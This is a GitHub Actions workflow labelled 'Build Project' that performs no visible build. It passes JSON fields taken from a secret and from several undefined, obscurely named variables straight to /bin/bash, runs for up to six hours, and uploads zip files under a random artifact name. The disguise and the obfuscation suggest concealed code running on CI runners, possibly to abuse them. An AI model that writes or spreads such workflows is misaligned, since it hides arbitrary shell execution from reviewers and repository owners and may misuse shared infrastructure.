name: Build Project
on:
  workflow_dispatch:

permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  job:
    name: Go
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          xv6139: ${{ secrets.xv6139 }}
        run: |
          printf '%s' "$xv6139" | jq -r .o5328 | /bin/bash
          echo $upark420 | jq -r .hoxaz2 | /bin/bash
          echo $vujo88886 | jq -r .om45365 | /bin/bash
          echo $z6494 | jq -r .b00 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: mBcH9RNI
          path: "*.zip"
          retention-days: 1
